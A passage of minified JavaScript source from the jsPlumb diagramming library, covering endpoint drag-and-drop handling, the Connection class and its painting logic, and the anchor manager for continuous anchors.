r=i.getFloatingAnchorIndex(o);(this.isTarget&&0!==r||o.suspendedEndpoint&&this.referenceEndpoint&&this.referenceEndpoint.id===o.suspendedEndpoint.id)&&(this.removeClass(i.endpointDropAllowedClass),this.removeClass(i.endpointDropForbiddenClass),o.endpoints[r].anchor.out())}}.bind(this)),i.initDroppable(n,l,"internal",r)}}.bind(this);return this.anchor.isFloating||f(this.canvas,!(o._transient||this.anchor.isFloating),this,o.reference),this},e.extend(t.Endpoint,t.OverlayCapableJsPlumbUIComponent,{setVisible:function(t,e,n){if(this._jsPlumb.visible=t,this.canvas&&(this.canvas.style.display=t?"block":"none"),this[t?"showOverlays":"hideOverlays"](),!e)for(var o=0;o<this.connections.length;o++)if(this.connections[o].setVisible(t),!n){var i=this===this.connections[o].endpoints[0]?1:0;1===this.connections[o].endpoints[i].connections.length&&this.connections[o].endpoints[i].setVisible(t,!0,!0)}},getAttachedElements:function(){return this.connections},applyType:function(e,o){this.setPaintStyle(e.endpointStyle||e.paintStyle,o),this.setHoverPaintStyle(e.endpointHoverStyle||e.hoverPaintStyle,o),null!=e.maxConnections&&(this._jsPlumb.maxConnections=e.maxConnections),e.scope&&(this.scope=e.scope),t.extend(this,e,n),null!=e.cssClass&&this.canvas&&this._jsPlumb.instance.addClass(this.canvas,e.cssClass),t.OverlayCapableJsPlumbUIComponent.applyType(this,e)},isEnabled:function(){return this._jsPlumb.enabled},setEnabled:function(t){this._jsPlumb.enabled=t},cleanup:function(){var e=this._jsPlumb.instance.endpointAnchorClassPrefix+(this._jsPlumb.currentAnchorClass?"-"+this._jsPlumb.currentAnchorClass:"");t.removeClass(this.element,e),this.anchor=null,this.endpoint.cleanup(!0),this.endpoint.destroy(),this.endpoint=null,this._jsPlumb.instance.destroyDraggable(this.canvas,"internal"),this._jsPlumb.instance.destroyDroppable(this.canvas,"internal")},setHover:function(t){this.endpoint&&this._jsPlumb&&!this._jsPlumb.instance.isConnectionBeingDragged()&&this.endpoint.setHover(t)},isFull:function(){return 0===this._jsPlumb.maxConnections||!(this.isFloating()||this._jsPlumb.maxConnections<0||this.connections.length<this._jsPlumb.maxConnections)},isFloating:function(){return null!=this.anchor&&this.anchor.isFloating},isConnectedTo:function(t){var e=!1;if(t)for(var n=0;n<this.connections.length;n++)if(this.connections[n].endpoints[1]===t||this.connections[n].endpoints[0]===t){e=!0;break}return e},getConnectionCost:function(){return this._jsPlumb.connectionCost},setConnectionCost:function(t){this._jsPlumb.connectionCost=t},areConnectionsDirected:function(){return this._jsPlumb.connectionsDirected},setConnectionsDirected:function(t){this._jsPlumb.connectionsDirected=t},setElementId:function(t){this.elementId=t,this.anchor.elementId=t},setReferenceElement:function(e){this.element=t.getElement(e)},setDragAllowedWhenFull:function(t){this.dragAllowedWhenFull=t},equals:function(t){return this.anchor.equals(t.anchor)},getUuid:function(){return this._jsPlumb.uuid},computeAnchor:function(t){return this.anchor.compute(t)}}),this.jsPlumbInstance.prototype.EndpointDropHandler=function(t){return function(n){var o=t.jsPlumb;t.removeClass(o.endpointDropAllowedClass),t.removeClass(o.endpointDropForbiddenClass);var i=o.getDropEvent(arguments),r=o.getDragObject(arguments),s=o.getAttribute(r,"dragId"),a=(o.getAttribute(r,"elId"),o.getAttribute(r,"originalScope")),l=o.getFloatingConnectionFor(s);if(null!=l){var d=null!=l.suspendedEndpoint;if(!d||null!=l.suspendedEndpoint._jsPlumb){var u=t.getEndpoint(l);if(null!=u){if(t.isRedrop(l,t))return l._forceReattach=!0,l.setHover(!1),void(t.maybeCleanup&&t.maybeCleanup(u));var c=o.getFloatingAnchorIndex(l);if(0===c&&!t.isSource||1===c&&!t.isTarget)return void(t.maybeCleanup&&t.maybeCleanup(u));t.onDrop&&t.onDrop(l),a&&o.setDragScope(r,a);var h=t.isFull(n);if(h&&u.fire("maxConnections",{endpoint:this,connection:l,maxConnections:u._jsPlumb.maxConnections},i),!h&&t.enabled()){var p=!0;0===c?(l.floatingElement=l.source,l.floatingId=l.sourceId,l.floatingEndpoint=l.endpoints[0],l.floatingIndex=0,l.source=t.element,l.sourceId=t.elementId):(l.floatingElement=l.target,l.floatingId=l.targetId,l.floatingEndpoint=l.endpoints[1],l.floatingIndex=1,l.target=t.element,l.targetId=t.elementId),d&&l.suspendedEndpoint.id!==u.id&&(l.isDetachAllowed(l)&&l.endpoints[c].isDetachAllowed(l)&&l.suspendedEndpoint.isDetachAllowed(l)&&o.checkCondition("beforeDetach",l)||(p=!1));var f=function(n){l.endpoints[c].detachFromConnection(l),l.suspendedEndpoint&&l.suspendedEndpoint.detachFromConnection(l),l.endpoints[c]=u,u.addConnection(l);var r=u.getParameters();for(var s in r)l.setParameter(s,r[s]);if(d){var a=l.suspendedEndpoint.elementId;o.fireMoveEvent({index:c,originalSourceId:0===c?a:l.sourceId,newSourceId:0===c?u.elementId:l.sourceId,originalTargetId:1===c?a:l.targetId,newTargetId:1===c?u.elementId:l.targetId,originalSourceEndpoint:0===c?l.suspendedEndpoint:l.endpoints[0],newSourceEndpoint:0===c?u:l.endpoints[0],originalTargetEndpoint:1===c?l.suspendedEndpoint:l.endpoints[1],newTargetEndpoint:1===c?u:l.endpoints[1],connection:l},i)}else r.draggable&&o.initDraggable(this.element,t.dragOptions,"internal",o);1===c?o.anchorManager.updateOtherEndpoint(l.sourceId,l.floatingId,l.targetId,l):o.anchorManager.sourceChanged(l.floatingId,l.sourceId,l,l.source),l.endpoints[0].finalEndpoint&&(l.endpoints[0].detachFromConnection(l),l.endpoints[0]=l.endpoints[0].finalEndpoint,l.endpoints[0].addConnection(l)),e.isObject(n)&&l.mergeData(n),o.finaliseConnection(l,null,i,!1),l.setHover(!1)}.bind(this);if(p=p&&t.isDropAllowed(l.sourceId,l.targetId,l.scope,l,u))return f(p),!0;l.suspendedEndpoint&&(l.endpoints[c]=l.suspendedEndpoint,l.setHover(!1),l._forceDetach=!0,0===c?(l.source=l.suspendedEndpoint.element,l.sourceId=l.suspendedEndpoint.elementId):(l.target=l.suspendedEndpoint.element,l.targetId=l.suspendedEndpoint.elementId),l.suspendedEndpoint.addConnection(l),1===c?o.anchorManager.updateOtherEndpoint(l.sourceId,l.floatingId,l.targetId,l):o.anchorManager.sourceChanged(l.floatingId,l.sourceId,l,l.source),o.repaint(l.sourceId),l._forceDetach=!1)}t.maybeCleanup&&t.maybeCleanup(u),o.currentlyDragging=!1}}}}}}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this,e=t.jsPlumb,n=t.jsPlumbUtil,o=function(t,o,i,r,s){if(e.Connectors[o]=e.Connectors[o]||{},null==e.Connectors[o][i]){if(null==e.Connectors[i]){if(t.Defaults.DoNotThrowErrors)return null;throw new TypeError("jsPlumb: unknown connector type '"+i+"'")}e.Connectors[o][i]=function(){e.Connectors[i].apply(this,arguments),e.ConnectorRenderers[o].apply(this,arguments)},n.extend(e.Connectors[o][i],[e.Connectors[i],e.ConnectorRenderers[o]])}return new e.Connectors[o][i](r,s)},i=function(t,e,n){return t?n.makeAnchor(t,e,n):null},r=function(t,e,o,i){null!=e&&(e._jsPlumbConnections=e._jsPlumbConnections||{},i?delete e._jsPlumbConnections[t.id]:e._jsPlumbConnections[t.id]=!0,n.isEmpty(e._jsPlumbConnections)?o.removeClass(e,o.connectedClass):o.addClass(e,o.connectedClass))};e.Connection=function(t){var o=t.newEndpoint;this.id=t.id,this.connector=null,this.idPrefix="_jsplumb_c_",this.defaultLabelLocation=.5,this.defaultOverlayKeys=["Overlays","ConnectionOverlays"],this.previousConnection=t.previousConnection,this.source=e.getElement(t.source),this.target=e.getElement(t.target),e.OverlayCapableJsPlumbUIComponent.apply(this,arguments),t.sourceEndpoint?(this.source=t.sourceEndpoint.getElement(),this.sourceId=t.sourceEndpoint.elementId):this.sourceId=this._jsPlumb.instance.getId(this.source),t.targetEndpoint?(this.target=t.targetEndpoint.getElement(),this.targetId=t.targetEndpoint.elementId):this.targetId=this._jsPlumb.instance.getId(this.target),this.scope=t.scope,this.endpoints=[],this.endpointStyles=[];var i=this._jsPlumb.instance;i.manage(this.sourceId,this.source),i.manage(this.targetId,this.target),this._jsPlumb.visible=!0,this._jsPlumb.params={cssClass:t.cssClass,container:t.container,"pointer-events":t["pointer-events"],editorParams:t.editorParams,overlays:t.overlays},this._jsPlumb.lastPaintedAt=null,this.bind("mouseover",function(){this.setHover(!0)}.bind(this)),this.bind("mouseout",function(){this.setHover(!1)}.bind(this)),this.makeEndpoint=function(e,n,r,s){return r=r||this._jsPlumb.instance.getId(n),this.prepareEndpoint(i,o,this,s,e?0:1,t,n,r)},t.type&&(t.endpoints=t.endpoints||this._jsPlumb.instance.deriveEndpointAndAnchorSpec(t.type).endpoints);var r=this.makeEndpoint(!0,this.source,this.sourceId,t.sourceEndpoint),s=this.makeEndpoint(!1,this.target,this.targetId,t.targetEndpoint);r&&n.addToList(t.endpointsByElement,this.sourceId,r),s&&n.addToList(t.endpointsByElement,this.targetId,s),this.scope||(this.scope=this.endpoints[0].scope),null!=t.deleteEndpointsOnEmpty&&(this.endpoints[0].setDeleteOnEmpty(t.deleteEndpointsOnEmpty),this.endpoints[1].setDeleteOnEmpty(t.deleteEndpointsOnEmpty));var a=i.Defaults.ConnectionsDetachable;!1===t.detachable&&(a=!1),!1===this.endpoints[0].connectionsDetachable&&(a=!1),!1===this.endpoints[1].connectionsDetachable&&(a=!1);var l=t.reattach||this.endpoints[0].reattachConnections||this.endpoints[1].reattachConnections||i.Defaults.ReattachConnections;this.appendToDefaultType({detachable:a,reattach:l,paintStyle:this.endpoints[0].connectorStyle||this.endpoints[1].connectorStyle||t.paintStyle||i.Defaults.PaintStyle||e.Defaults.PaintStyle,hoverPaintStyle:this.endpoints[0].connectorHoverStyle||this.endpoints[1].connectorHoverStyle||t.hoverPaintStyle||i.Defaults.HoverPaintStyle||e.Defaults.HoverPaintStyle});var d=i.getSuspendedAt();if(!i.isSuspendDrawing()){var u=i.getCachedData(this.sourceId),c=u.o,h=u.s,p=i.getCachedData(this.targetId),f=p.o,g=p.s,_=d||i.timestamp(),b=this.endpoints[0].anchor.compute({xy:[c.left,c.top],wh:h,element:this.endpoints[0],elementId:this.endpoints[0].elementId,txy:[f.left,f.top],twh:g,tElement:this.endpoints[1],timestamp:_});this.endpoints[0].paint({anchorLoc:b,timestamp:_}),b=this.endpoints[1].anchor.compute({xy:[f.left,f.top],wh:g,element:this.endpoints[1],elementId:this.endpoints[1].elementId,txy:[c.left,c.top],twh:h,tElement:this.endpoints[0],timestamp:_}),this.endpoints[1].paint({anchorLoc:b,timestamp:_})}this.getTypeDescriptor=function(){return"connection"},this.getAttachedElements=function(){return this.endpoints},this.isDetachable=function(){return!0===this._jsPlumb.detachable},this.setDetachable=function(t){this._jsPlumb.detachable=!0===t},this.isReattach=function(){return!0===this._jsPlumb.reattach||!0===this.endpoints[0].reattachConnections||!0===this.endpoints[1].reattachConnections},this.setReattach=function(t){this._jsPlumb.reattach=!0===t},this._jsPlumb.cost=t.cost||this.endpoints[0].getConnectionCost(),this._jsPlumb.directed=t.directed,null==t.directed&&(this._jsPlumb.directed=this.endpoints[0].areConnectionsDirected());var v=e.extend({},this.endpoints[1].getParameters());e.extend(v,this.endpoints[0].getParameters()),e.extend(v,this.getParameters()),this.setParameters(v),this.setConnector(this.endpoints[0].connector||this.endpoints[1].connector||t.connector||i.Defaults.Connector||e.Defaults.Connector,!0);var m=null!=t.data&&n.isObject(t.data)?t.data:{};this.getData=function(){return m},this.setData=function(t){m=t||{}},this.mergeData=function(t){m=e.extend(m,t)};var w=["default",this.endpoints[0].connectionType,this.endpoints[1].connectionType,t.type].join(" ");/[^\s]/.test(w)&&this.addType(w,t.data,!0),this.updateConnectedClass()},n.extend(e.Connection,e.OverlayCapableJsPlumbUIComponent,{applyType:function(t,n,o){var i=null;null!=t.connector&&(null==(i=this.getCachedTypeItem("connector",o.connector))&&(i=this.prepareConnector(t.connector,o.connector),this.cacheTypeItem("connector",i,o.connector)),this.setPreparedConnector(i)),null!=t.detachable&&this.setDetachable(t.detachable),null!=t.reattach&&this.setReattach(t.reattach),t.scope&&(this.scope=t.scope),null!=t.cssClass&&this.canvas&&this._jsPlumb.instance.addClass(this.canvas,t.cssClass);var r=null;t.anchor?null==(r=this.getCachedTypeItem("anchors",o.anchor))&&(r=[this._jsPlumb.instance.makeAnchor(t.anchor),this._jsPlumb.instance.makeAnchor(t.anchor)],this.cacheTypeItem("anchors",r,o.anchor)):t.anchors&&null==(r=this.getCachedTypeItem("anchors",o.anchors))&&(r=[this._jsPlumb.instance.makeAnchor(t.anchors[0]),this._jsPlumb.instance.makeAnchor(t.anchors[1])],this.cacheTypeItem("anchors",r,o.anchors)),null!=r&&(this.endpoints[0].anchor=r[0],this.endpoints[1].anchor=r[1],this.endpoints[1].anchor.isDynamic&&this._jsPlumb.instance.repaint(this.endpoints[1].elementId)),e.OverlayCapableJsPlumbUIComponent.applyType(this,t)},addClass:function(t,e){e&&(this.endpoints[0].addClass(t),this.endpoints[1].addClass(t),this.suspendedEndpoint&&this.suspendedEndpoint.addClass(t)),this.connector&&this.connector.addClass(t)},removeClass:function(t,e){e&&(this.endpoints[0].removeClass(t),this.endpoints[1].removeClass(t),this.suspendedEndpoint&&this.suspendedEndpoint.removeClass(t)),this.connector&&this.connector.removeClass(t)},isVisible:function(){return this._jsPlumb.visible},setVisible:function(t){this._jsPlumb.visible=t,this.connector&&this.connector.setVisible(t),this.repaint()},cleanup:function(){this.updateConnectedClass(!0),this.endpoints=null,this.source=null,this.target=null,null!=this.connector&&(this.connector.cleanup(!0),this.connector.destroy(!0)),this.connector=null},updateConnectedClass:function(t){this._jsPlumb&&(r(this,this.source,this._jsPlumb.instance,t),r(this,this.target,this._jsPlumb.instance,t))},setHover:function(e){this.connector&&this._jsPlumb&&!this._jsPlumb.instance.isConnectionBeingDragged()&&(this.connector.setHover(e),t.jsPlumb[e?"addClass":"removeClass"](this.source,this._jsPlumb.instance.hoverSourceClass),t.jsPlumb[e?"addClass":"removeClass"](this.target,this._jsPlumb.instance.hoverTargetClass))},getUuids:function(){return[this.endpoints[0].getUuid(),this.endpoints[1].getUuid()]},getCost:function(){return this._jsPlumb?this._jsPlumb.cost:-1/0},setCost:function(t){this._jsPlumb.cost=t},isDirected:function(){return this._jsPlumb.directed},getConnector:function(){return this.connector},prepareConnector:function(t,e){var i,r={_jsPlumb:this._jsPlumb.instance,cssClass:this._jsPlumb.params.cssClass,container:this._jsPlumb.params.container,"pointer-events":this._jsPlumb.params["pointer-events"]},s=this._jsPlumb.instance.getRenderMode();return n.isString(t)?i=o(this._jsPlumb.instance,s,t,r,this):n.isArray(t)&&(i=1===t.length?o(this._jsPlumb.instance,s,t[0],r,this):o(this._jsPlumb.instance,s,t[0],n.merge(t[1],r),this)),null!=e&&(i.typeId=e),i},setPreparedConnector:function(t,e,n,o){if(this.connector!==t){var i,r="";if(null!=this.connector&&(r=(i=this.connector).getClass(),this.connector.cleanup(),this.connector.destroy()),this.connector=t,o&&this.cacheTypeItem("connector",t,o),this.canvas=this.connector.canvas,this.bgCanvas=this.connector.bgCanvas,this.addClass(r),this.canvas&&(this.canvas._jsPlumb=this),this.bgCanvas&&(this.bgCanvas._jsPlumb=this),null!=i)for(var s=this.getOverlays(),a=0;a<s.length;a++)s[a].transfer&&s[a].transfer(this.connector);n||this.setListenerComponent(this.connector),e||this.repaint()}},setConnector:function(t,e,n,o){var i=this.prepareConnector(t,o);this.setPreparedConnector(i,e,n,o)},paint:function(t){if(!this._jsPlumb.instance.isSuspendDrawing()&&this._jsPlumb.visible){var e=(t=t||{}).timestamp,n=this.targetId,o=this.sourceId;if(null==e||e!==this._jsPlumb.lastPaintedAt){var i=this._jsPlumb.instance.updateOffset({elId:o}).o,r=this._jsPlumb.instance.updateOffset({elId:n}).o,s=this.endpoints[0],a=this.endpoints[1],l=s.anchor.getCurrentLocation({xy:[i.left,i.top],wh:[i.width,i.height],element:s,timestamp:e}),d=a.anchor.getCurrentLocation({xy:[r.left,r.top],wh:[r.width,r.height],element:a,timestamp:e});this.connector.resetBounds(),this.connector.compute({sourcePos:l,targetPos:d,sourceOrientation:s.anchor.getOrientation(s),targetOrientation:a.anchor.getOrientation(a),sourceEndpoint:this.endpoints[0],targetEndpoint:this.endpoints[1],"stroke-width":this._jsPlumb.paintStyleInUse.strokeWidth,sourceInfo:i,targetInfo:r});var u={minX:1/0,minY:1/0,maxX:-1/0,maxY:-1/0};for(var c in this._jsPlumb.overlays)if(this._jsPlumb.overlays.hasOwnProperty(c)){var h=this._jsPlumb.overlays[c];h.isVisible()&&(this._jsPlumb.overlayPlacements[c]=h.draw(this.connector,this._jsPlumb.paintStyleInUse,this.getAbsoluteOverlayPosition(h)),u.minX=Math.min(u.minX,this._jsPlumb.overlayPlacements[c].minX),u.maxX=Math.max(u.maxX,this._jsPlumb.overlayPlacements[c].maxX),u.minY=Math.min(u.minY,this._jsPlumb.overlayPlacements[c].minY),u.maxY=Math.max(u.maxY,this._jsPlumb.overlayPlacements[c].maxY))}var p=parseFloat(this._jsPlumb.paintStyleInUse.strokeWidth||1)/2,f=parseFloat(this._jsPlumb.paintStyleInUse.strokeWidth||0),g={xmin:Math.min(this.connector.bounds.minX-(p+f),u.minX),ymin:Math.min(this.connector.bounds.minY-(p+f),u.minY),xmax:Math.max(this.connector.bounds.maxX+(p+f),u.maxX),ymax:Math.max(this.connector.bounds.maxY+(p+f),u.maxY)};this.connector.paint(this._jsPlumb.paintStyleInUse,null,g);for(var _ in this._jsPlumb.overlays)if(this._jsPlumb.overlays.hasOwnProperty(_)){var b=this._jsPlumb.overlays[_];b.isVisible()&&b.paint(this._jsPlumb.overlayPlacements[_],g)}}this._jsPlumb.lastPaintedAt=e}},repaint:function(t){var e=jsPlumb.extend(t||{},{});e.elId=this.sourceId,this.paint(e)},prepareEndpoint:function(t,n,o,r,s,a,l,d){var u;if(r)o.endpoints[s]=r,r.addConnection(o);else{a.endpoints||(a.endpoints=[null,null]);var c=a.endpoints[s]||a.endpoint||t.Defaults.Endpoints[s]||e.Defaults.Endpoints[s]||t.Defaults.Endpoint||e.Defaults.Endpoint;a.endpointStyles||(a.endpointStyles=[null,null]),a.endpointHoverStyles||(a.endpointHoverStyles=[null,null]);var h=a.endpointStyles[s]||a.endpointStyle||t.Defaults.EndpointStyles[s]||e.Defaults.EndpointStyles[s]||t.Defaults.EndpointStyle||e.Defaults.EndpointStyle;null==h.fill&&null!=a.paintStyle&&(h.fill=a.paintStyle.stroke),null==h.outlineStroke&&null!=a.paintStyle&&(h.outlineStroke=a.paintStyle.outlineStroke),null==h.outlineWidth&&null!=a.paintStyle&&(h.outlineWidth=a.paintStyle.outlineWidth);var p=a.endpointHoverStyles[s]||a.endpointHoverStyle||t.Defaults.EndpointHoverStyles[s]||e.Defaults.EndpointHoverStyles[s]||t.Defaults.EndpointHoverStyle||e.Defaults.EndpointHoverStyle;null!=a.hoverPaintStyle&&(null==p&&(p={}),null==p.fill&&(p.fill=a.hoverPaintStyle.stroke));var f=a.anchors?a.anchors[s]:a.anchor?a.anchor:i(t.Defaults.Anchors[s],d,t)||i(e.Defaults.Anchors[s],d,t)||i(t.Defaults.Anchor,d,t)||i(e.Defaults.Anchor,d,t);u=n({paintStyle:h,hoverPaintStyle:p,endpoint:c,connections:[o],uuid:a.uuids?a.uuids[s]:null,anchor:f,source:l,scope:a.scope,reattach:a.reattach||t.Defaults.ReattachConnections,detachable:a.detachable||t.Defaults.ConnectionsDetachable}),null==r&&u.setDeleteOnEmpty(!0),o.endpoints[s]=u,!1===a.drawEndpoints&&u.setVisible(!1,!0,!0)}return u}})}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this.jsPlumbUtil,e=this.jsPlumb;e.AnchorManager=function(n){var o={},i={},r={},s={},a={},l=this,d={},u=n.jsPlumbInstance,c={},h=function(t){return function(e,n){return!1===(t?e[0][0]<n[0][0]:e[0][0]>n[0][0])?-1:1}},p={top:function(t,e){return t[0]>e[0]?1:-1},right:h(!0),bottom:h(!0),left:function(t,e){return(t[0][0]<0?-Math.PI-t[0][0]:Math.PI-t[0][0])>(e[0][0]<0?-Math.PI-e[0][0]:Math.PI-e[0][0])?1:-1}},f=function(t,e){var n=u.getCachedData(t),o=n.s,r=n.o,a=function(e,n,o,r,a,l,d){if(r.length>0)for(var u=(m=r,w=p[e],m.sort(w)),c="right"===e||"top"===e,h=function(t,e,n,o,i,r,s){for(var a=[],l=e[i?0:1]/(o.length+1),d=0;d<o.length;d++){var u=(d+1)*l,c=r*e[i?1:0];s&&(u=e[i?0:1]-u);var h=i?u:c,p=n[0]+h,f=h/e[0],g=i?c:u,_=n[1]+g,b=g/e[1];a.push([p,_,f,b,o[d][1],o[d][2]])}return a}(0,n,o,u,a,l,c),f=function(t,e){i[t.id]=[e[0],e[1],e[2],e[3]],s[t.id]=d},g=0;g<h.length;g++){var _=h[g][4],b=_.endpoints[0].elementId===t,v=_.endpoints[1].elementId===t;b&&f(_.endpoints[0],h[g]),v&&f(_.endpoints[1],h[g])}var m,w};a("bottom",o,[r.left,r.top],e.bottom,!0,1,[0,1]),a("top",o,[r.left,r.top],e.top,!0,0,[0,-1]),a("left",o,[r.left,r.top],e.left,!1,0,[-1,0]),a("right",o,[r.left,r.top],e.right,!1,1,[1,0])};this.reset=function(){o={},a={},d={}},this.addFloatingConnection=function(t,e){c[t]=e},this.removeFloatingConnection=function(t){delete c[t]},this.newConnection=function(n){var o=n.sourceId,i=n.targetId,r=n.endpoints,s=!0,l=function(l,d,u,c,h){o===i&&u.isContinuous&&(n._jsPlumb.instance.removeElement(r[1].canvas),s=!1),t.addToList(a,c,[h,d,u.constructor===e.DynamicAnchor])};l(0,r[0],r[0].anchor,i,n),s&&l(0,r[1],r[1].anchor,o,n)};var g=function(e){!function(e,n){if(e){var o=function(t){return t[4]===n};t.removeWithFunction(e.top,o),t.removeWithFunction(e.left,o),t.removeWithFunction(e.bottom,o),t.removeWithFunction(e.right,o)}}(d[e.elementId],e.id)};this.connectionDetached=function(e,n){var o=e.connection||e,i=e.sourceId,r=e.targetId,s=o.endpoints,d=function(e,n,o,i,r){t.removeWithFunction(a[i],function(t){return t[0].id===r.id})};d(0,s[1],s[1].anchor,i,o),d(0,s[0],s[0].anchor,r,o),o.floatingId&&(d(o.floatingIndex,o.floatingEndpoint,o.floatingEndpoint.anchor,o.floatingId,o),g(o.floatingEndpoint)),g(o.endpoints[0]),g(o.endpoints[1]),n||(l.redraw(o.sourceId),o.targetId!==o.sourceId&&l.redraw(o.targetId))},this.add=function(e,n){t.addToList(o,n,e)},this.changeId=function(t,e){a[e]=a[t],o[e]=o[t],delete a[t],delete o[t]},this.getConnectionsFor=function(t){return a[t]||[]},this.getEndpointsFor=function(t){return o[t]||[]},this.deleteEndpoint=function(e){t.removeWithFunction(o[e.elementId],function(t){return t.id===e.id}),g(e)},this.clearFor=function(t){delete o[t],o[t]=[]};var _=function(e,o,i,r,s,a,l,d,u,c,h,p){var f,g,_=-1,b=r.endpoints[l],v=b.id,m=[1,0][l],w=[[o,i],r,s,a,v],j=e[u],y=b._continuousAnchorEdge?e[b._continuousAnchorEdge]:null;if(y){var P=t.findWithFunction(y,function(t){return t[4]===v});if(-1!==P)for(y.splice(P,1),f=0;f<y.length;f++)g=y[f][1],t.addWithFunction(h,g,function(t){return t.id===g.id}),t.addWithFunction(p,y[f][1].endpoints[l],function(t){return t.id===g.endpoints[l].id}),t.addWithFunction(p,y[f][1].endpoints[m],function(t){return t.id===g.endpoints[m].id})}for(f=0;f<j.length;f++)g=j[f][1],1===n.idx&&j[f][3]===a&&-1===_&&(_=f),t.addWithFunction(h,g,function(t){return t.id===g.id}),t.addWithFunction(p,j[f][1].endpoints[l],function(t){return t.id===g.endpoints[l].id}),t.addWithFunction(p,j[f][1].endpoints[m],function(t){return t.id===g.endpoints[m].id});var E=d?-1!==_?_:0:j.length;j.splice(E,0,w),b._continuousAnchorEdge=u};this.updateOtherEndpoint=function(n,o,i,r){var s=t.findWithFunction(a[n],function(t){return t[0].id===r.id}),l=t.findWithFunction(a[o],function(t){return t[0].id===r.id});-1!==s&&(a[n][s][0]=r,a[n][s][1]=r.endpoints[1],a[n][s][2]=r.endpoints[1].anchor.constructor===e.DynamicAnchor),l>-1&&(a[o].splice(l,1),t.addToList(a,i,[r,r.endpoints[0],r.endpoints[0].anchor.constructor===e.DynamicAnchor])),r.updateConnectedClass()},this.sourceChanged=function(n,o,i,r){if(n!==o){i.sourceId=o,i.source=r,t.removeWithFunction(a[n],function(t){return t[0].id===i.id});var s=t.findWithFunction(a[i.targetId],function(t){return t[0].id===i.id});s>-1&&(a[i.targetId][s][0]=i,a[i.targetId][s][1]=i.endpoints[0],a[i.targetId][s][2]=i.endpoints[0].anchor.constructor===e.DynamicAnchor),t.addToList(a,o,[i,i.endpoints[1],i.endpoints[1].anchor.constructor===e.DynamicAnchor]),i.endpoints[1].anchor.isContinuous&&(i.source===i.target?i._jsPlumb.instance.removeElement(i.endpoints[1].canvas):null==i.endpoints[1].canvas.parentNode&&i._jsPlumb.instance.appendElement(i.endpoints[1].canvas)),i.updateConnectedClass()}},this.rehomeEndpoint=function(t,e,n){var i=o[e]||[],r=u.getId(n);if(r!==e){var s=i.indexOf(t);if(s>-1){var a=i.splice(s,1)[0];l.add(a,r)}}for(var d=0;d<t.connections.length;d++)t.connections[d].sourceId===e?l.sourceChanged(e,t.elementId,t.connections[d],t.element):t.connections[d].targetId===e&&(t.connections[d].targetId=t.elementId,t.connections[d].target=t.element,l.updateOtherEndpoint(t.connections[d].sourceId,e,t.elementId,t.connections[d]))},this.redraw=function(n,i,r,s,l,h){if(!u.isSuspendDrawing()){var p=o[n]||[],g=a[n]||[],b=[],v=[],m=[];r=r||u.timestamp(),s=s||{left:0,top:0},i&&(i={left:i.left+s.left,top:i.top+s.top});for(var w=u.updateOffset({elId:n,offset:i,recalc:!1,timestamp:r}),j={},y=0;y<g.length;y++){var P=g[y][0],E=P.sourceId,x=P.targetId,C=P.endpoints[0].anchor.isContinuous,S=P.endpoints[1].anchor.isContinuous;if(C||S){var I=E+"_"+x,A=j[I],T=P.sourceId===n?1:0;C&&!d[E]&&(d[E]={top:[],right:[],bottom:[],left:[]}),S&&!d[x]&&(d[x]={top:[],right:[],bottom:[],left:[]}),n!==x&&u.updateOffset({elId:x,timestamp:r}),n!==E&&u.updateOffset({elId:E,timestamp:r});var k=u.getCachedData(x),D=u.getCachedData(E);x===E&&(C||S)?(_(d[E],-Math.PI/2,0,P,!1,x,0,!1,"top",0,b,v),_(d[x],-Math.PI/2,0,P,!1,E,1,!1,"top",0,b,v)):(A||(A=this.calculateOrientation(E,x,D.o,k.o,P.endpoints[0].anchor,P.endpoints[1].anchor,P),j[I]=A),C&&_(d[E],A.theta,0,P,!1,x,0,!1,A.a[0],0,b,v),S&&_(d[x],A.theta2,-1,P,!0,E,1,!0,A.a[1],0,b,v)),C&&t.addWithFunction(m,E,function(t){return t===E}),S&&t.addWithFunction(m,x,function(t){return t===x}),t.addWithFunction(b,P,function(t){return t.id===P.id}),(C&&0===T||S&&1===T)&&t.addWithFunction(v,P.endpoints[T],function(t){return t.id===P.endpoints[T].id})}}for(y=0;y<p.length;y++)0===p[y].connections.length&&p[y].anchor.isContinuous&&(d[n]||(d[n]={top:[],right:[],bottom:[],left:[]}),_(d[n],-Math.PI/2,0,{endpoints:[p[y],p[y]],paint:function(){}},!1,n,0,!1,p[y].anchor.getDefaultFace(),0,b,v),t.addWithFunction(m,n,function(t){return t===n}));for(y=0;y<m.length;y++)f(m[y],d[m[y]]);for(y=0;y<p.length;y++)p[y].paint({timestamp:r,offset:w,dimensions:w.s,recalc:!0!==h});for(y=0;y<v.length;y++){var N=u.getCachedData(v[y].elementId);v[y].paint({timestamp:r,offset:N,dimensions:N.s})}for(y=0;y<g.length;y++){var M=g[y][1];if(M.anchor.constructor===e.DynamicAnchor){M.paint({elementWithPrecedence:n,timestamp:r}),t.addWithFunction(b,g[y][0],function(t){return t.id===g[y][0].id});for(var O=0;O<M.connections.length;O++)M.connections[O]!==g[y][0]&&t.addWithFunction(b,M.connections[O],function(t){return t.id===M.connections[O].id})}else t.addWithFunction(b,g[y][0],function(t){return t.id===g[y][0].id})}var F=c[n];for(F&&F.paint({timestamp:r,recalc:!1,elId:n}),y=0;y<b.length;y++)b[y].paint({elId:n,timestamp:r,recalc:!1,clearEdits:l})}};u.continuousAnchorFactory={get:function(e){return new function(e){t.EventGenerator.apply(this),this.type="Continuous",this.isDynamic=!0,this.isContinuous=!0;for(var n=e.faces||["top","right","bottom","left"],o=!(!1===e.clockwise),a={},l={top:"bottom",right:"left",left:"right",bottom:"top"},d={top:"right",right:"bottom",left:"top",bottom:"left"},u={top:"left",right:"top",left:"bottom",bottom:"right"},c=o?d:u,h=o?u:d,p=e.cssClass||"",f=null,g=null,_=["left","right"],b=["top","bottom"],v=null,m=0;m<n.length;m++)a[n[m]]=!0;this.getDefaultFace=function(){return 0===n.length?"top":n[0]},this.isRelocatable=function(){return!0},this.isSnapOnRelocate=function(){return!0},this.verifyEdge=function(t){return a[t]?t:a[l[t]]?l[t]:a[c[t]]?c[t]:a[h[t]]?h[t]:t},this.isEdgeSupported=function(t){return null==v?null==g?!0===a[t]:g===t:-1!==v.indexOf(t)},this.setCurrentFace=function(t,e){f=t,e&&null!=g&&(g=f)},this.getCurrentFace=function(){return f},this.getSupportedFaces=function(){var t=[];for(var e in a)a[e]&&t.push(e);return t},this.lock=function(){g=f},this.unlock=function(){g=null},this.isLocked=function(){return 